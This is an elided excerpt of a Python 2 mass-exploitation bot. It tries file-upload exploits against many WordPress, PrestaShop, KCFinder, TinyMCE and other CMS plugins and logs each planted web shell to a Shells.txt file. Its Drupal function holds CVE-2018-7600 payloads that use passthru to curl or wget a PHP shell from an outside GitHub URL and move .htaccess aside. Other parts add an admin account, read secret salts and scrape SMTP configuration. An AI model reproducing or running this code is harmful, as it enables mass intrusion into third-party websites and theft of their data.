            print '{}Wordpress: {} {} :  {}{} wp-ecommerce-shop-styling     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        contax = {
            'upload_path': '../../../../uploads/' }
        isabox = {
            'wpcsp_file': (filenames, shell, 'text/html') }
        ...
        if 'izocin' in sonzsxlib.content:
            print '{}Wordpress: {} {} :  {}{} wp-copysafe-pdf     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/wp-content/uploads/' + filenames + '\n')
            sys.exit()
        else:
        ...
        if 'izocin' in sonzsdlib.content:
            print '{}Wordpress: {} {} :  {}{} wpallimport     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in izflib.content:
            print '{}Wordpress: {} {} :  {}{} woocommerce produits     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in acflib.content:
            print '{}Wordpress: {} {} :  {}{} acf-frontend-display     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in sonzsxylib.content:
            print '{}Wordpress: {} {} :  {}{} konzept     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'izocin' in acfxlib.content:
            print '{}Wordpress: {} {} :  {}{} RightNow     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/wp-content/uploads/settingsimages/' + filenames + '\n')
            sys.exit()
        else:
...
def unkbot(url):
    ...
    try:
        files = {
            'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data') }
        ...
        if 'uname' in lib.content:
            print '{}Unknow: {} {} : {}{} Kcfinder1     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'uname' in lib.content:
            print '{}Unknow: {} {} : {}{} Kcfinder2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'uname' in lib.content:
            print '{}Unknow: {} {} : {}{} Kcfinder3     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'uname' in lib.content:
            print '{}Unknow: {} {} : {}{} Kcfinder4     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'uname' in lib.content:
            print '{}Unknow: {} {} : {}{} Kcfinder5     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'uname' in lib.content:
            print '{}Unknow: {} {} : {}{} Kcfinder6     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'uname' in lib.content:
            print '{}Unknow: {} {} : {}{} Kcfinder7     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'uname' in lib.content:
            print '{}Unknow: {} {} : {}{} Kcfinder8     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'uname' in lib.content:
            print '{}Unknow: {} {} : {}{} Kcfinder9     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'uname' in lib.content:
            print '{}Unknow: {} {} : {}{} Kcfinder10     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        files = {
            'files[]': (filte, open(filte, 'rb'), 'multipart/form-data') }
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} Web-SEO     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if '{"files":' in lib.content:
            print '{}Unknow: {} {} : {}{} Htmcss     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} BuilderEngine     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        post = {
            'submit': 'Transferir archivo' }
        files = {
            'file': (filte, open(filte, 'rb'), 'multipart/form-data') }
        ...
        if 'ddd.php' in lib.content:
            print '{}Unknow: {} {} : {}{} tinymce1     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        token = re.findall('http://(.*?)ddd.php', lib.text)
        if 'ddd.php' in lib.content:
            print '{}Unknow: {} {} : {}{} tinymce2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write('http://' + token[0] + 'ddd.php' + '\n')
            sys.exit()
        else:
        ...
        token = re.findall('http://(.*?)ddd.php', lib.text)
        if 'ddd.php' in lib.content:
            print '{}Unknow: {} {} : {}{} tinymce3     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write('http://' + token[0] + 'ddd.php' + '\n')
            sys.exit()
        else:
        ...
        token = re.findall('http://(.*?)ddd.php', lib.text)
        if 'ddd.php' in lib.content:
            print '{}Unknow: {} {} : {}{} tinymce4     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write('http://' + token[0] + 'ddd.php' + '\n')
            sys.exit()
        else:
        ...
        token = re.findall('http://(.*?)ddd.php', lib.text)
        if 'ddd.php' in lib.content:
            print '{}Unknow: {} {} : {}{} tinymce5     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write('http://' + token[0] + 'ddd.php' + '\n')
            sys.exit()
        else:
        ...
        token = re.findall('http://(.*?)ddd.php', lib.text)
        if 'ddd.php' in lib.content:
            print '{}Unknow: {} {} : {}{} tinymce6     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write('http://' + token[0] + 'ddd.php' + '\n')
            sys.exit()
        else:
        ...
        token = re.findall('http://(.*?)ddd.php', lib.text)
        if 'ddd.php' in lib.content:
            print '{}Unknow: {} {} : {}{} tinymce7     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write('http://' + token[0] + 'ddd.php' + '\n')
            sys.exit()
        else:
        ...
        token = re.findall('http://(.*?)ddd.php', lib.text)
        if 'ddd.php' in lib.content:
            print '{}Unknow: {} {} : {}{} tinymce8     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write('http://' + token[0] + 'ddd.php' + '\n')
            sys.exit()
        else:
        ...
        token = re.findall('http://(.*?)ddd.php', lib.text)
        if 'ddd.php' in lib.content:
            print '{}Unknow: {} {} : {}{} tinymce9     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write('http://' + token[0] + 'ddd.php' + '\n')
            sys.exit()
        else:
        ...
        token = re.findall('http://(.*?)ddd.php', lib.text)
        if 'ddd.php' in lib.content:
            print '{}Unknow: {} {} : {}{} tinymce10     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write('http://' + token[0] + 'ddd.php' + '\n')
            sys.exit()
        else:
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} ajaxfilemanager1     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} ajaxfilemanager2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} ajaxfilemanager3     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} ajaxfilemanager4     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} ajaxfilemanager5     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} aidiCMS     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} log1cms2.0     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} Zenphoto     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} PHPMyFAQ 2.7.0     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} Arrayfiles     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} Design Factory     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} vehiculo     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} upload9.1.0     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} Filecms     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} jquery     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} Keybase     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} AndroidFile     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/web/image/Images/ddd.php' + '\n')
            sys.exit()
        else:
            print '{}Unknow: {} {} : {}{} AndroidFile     {}{} Failed  '.format(sb, sd, url, fc, fc, sb, fr)
        files = {
            'NewFile': (fck, open(fck, 'rb'), 'multipart/form-data') }
        ...
        if 'pwned' in lib.content:
            print '{}Unknow: {} {} : {}{} FckEditor     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'successfully' in lib.content:
            print '{}Unknow: {} {} : {}{} Netvidade     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'c4e758b00c25ade40a8d29c6cccef6c4' in izo.content:
            print '{}Unknow: {} {} : {}{} timthumb     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'SangPujaan' in lib.content:
            print '{}Unknow: {} {} : {}{} tinymce plugin     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        post = {
            ...
            'name': '../izocin.php' }
        files = {
            'file': (filenamexy, shell, 'text/html') }
        ...
        if 'izocin' in lib.content:
            print '{}Unknow: {} {} : {}{} Clipbucked     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'Uname' in cbanGravlib.content:
            print '{}Unknow: {} {} : {}{} Shell     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/shell.php' + '\n')
            sys.exit()
            ...
            print '[{}Unknow]: {} {}1\t       ====> {}{} Shell     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/098.php' + '\n')
            sys.exit()
...
def presbot(url):
    ...
    try:
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} columnadverts     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} vtemslideshow     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} realty     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} evogallery     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} evogallery2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} resaleform     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} megaproduct     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} soopamobile     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} soopamobile2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        bReflexlib = requests.get(url + '/modules/soopamobile2/slides/root.php?shell')
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} soopamobile3     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} soopabanners     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} vtermslideshow     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} simpleslideshow     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} productpageadverts     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} homepageadvertise     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} homepageadvertise2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} columnadverts2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} filesupload     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} jro_homepageadvertise     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} jro_homepageadvertise2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} leosliderlayer     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        bReflexlib = requests.get(url + '/modules/leosliderlayer/slides/root.php?shell')
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} leosliderlayer2     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} vtemskitter     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} additionalproductstabs     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} addthisplugin     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} attributewizardpro     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} attributewizardpro.OLD     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} 1attributewizardpro     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} attributewizardpro_x     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} advancedslider     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} cartabandonmentpro     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} cartabandonmentproOld     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} videostab     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} fieldvmegamenu     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} orderfiles     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} pk_flexmenu     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} pk_flexmenu_old     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} pk_vertflexmenu     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} nvn_export_orders     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        bReflexup = {
            'image_upload': open(jceupshell, 'rb') }
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} tdpsthemeoptionpanel     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} psmodthemeoptionpanel     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} masseditproduct     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in bReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} blocktestimonial     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
        ...
        if 'Bigbang' in ssbReflexlib.content:
            print '{}PrestaShoP: {} {} : {}{} wg24themeadministration     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            xshell_path = re.findall('uname(.*?)/uname', bReflexlib.content)
            token = xshell_path[0]
            Check = token.replace('[', '')
            Check1 = Check.replace(']', '')
...
def drurce(url):
    ...
    try:
        get_params = {
            ...
            'name[#markup]': 'curl https://raw.githubusercontent.com/izoking/2/master/u.php && wget https://raw.githubusercontent.com/izoking/2/master/u.php',
            'name[#type]': 'markup' }
        post_params = {
            'form_id': 'user_pass',
            '_triggering_element_name': 'name' }
        r = requests.post(url, data = post_params, params = get_params)
        m = re.search('<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
        if m:
            found = m.group(1)
        get_params = {
            'q': 'file/ajax/name/#value/' + found }
        post_params = {
            'form_build_id': found }
        r = requests.post(url, data = post_params, params = get_params)
        lib = requests.get(url + '/u.php')
        if re.findall('izocin', lib.content):
            print '{}Drupal: {} {} : {}{} CVE-2018-7600 RCE V7     {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/u.php' + '\n')
            sys.exit()
        get_params = {
            'q': 'user/password',
            'name[#post_render][]': 'passthru',
            'name[#markup]': 'mv+sites/default/files/.htaccess+htaccessx;curl+-o+sites/default/files/info.php+"https://raw.githubusercontent.com/izoking/2/master/u.php"',
            'name[#type]': 'markup' }
        post_params = {
            'form_id': 'user_pass',
            '_triggering_element_name': 'name' }
        ...
        if 'izocin' in requests.get(url + '/u.php', headers = headers).text:
            print '{}Drupal: {} {} : {}{} CVE-2018-7600 RCE V8    {}{} successfully upload  '.format(sb, sd, url, fc, fc, sb, fg)
            open('Vulns/Shells.txt', 'a').write(url + '/u.php' + '\n')
            sys.exit()
        else:
        ...
        if 'drupal_hash_salt' in ddrevlib.content:
            print '{}Drupal: {} {} : {}{} CVE-2018-9205     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'successfully!' in readcontent:
            print '{}Drupal: {} {} : {}{} Add Admin    {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
    ...
    try:
        ...
        if 'Welcome to osCommerce' in CheckVuln.text.encode('utf-8') or CheckVuln.status_code == 200:
            ...
            if 'Vuln' in izo.content:
                print '[{}osCommerce]: {} {}\t       ====> {}{} RCE     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
...
def zenbot(url):
    ...
    try:
        ...
        if 'Bootstrap' in nmxcrevlib.content:
            print '[{}ZendFramework]: {} {}\t       ====> {}{} Configuration     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
        ...
        if 'smtp' in mmnxcrevlib.content:
            print '[{}ZendFramework]: {} {}\t       ====> {}{} Smtp     {}{} successfully  '.format(sb, sd, url, fc, fc, sb, fg)
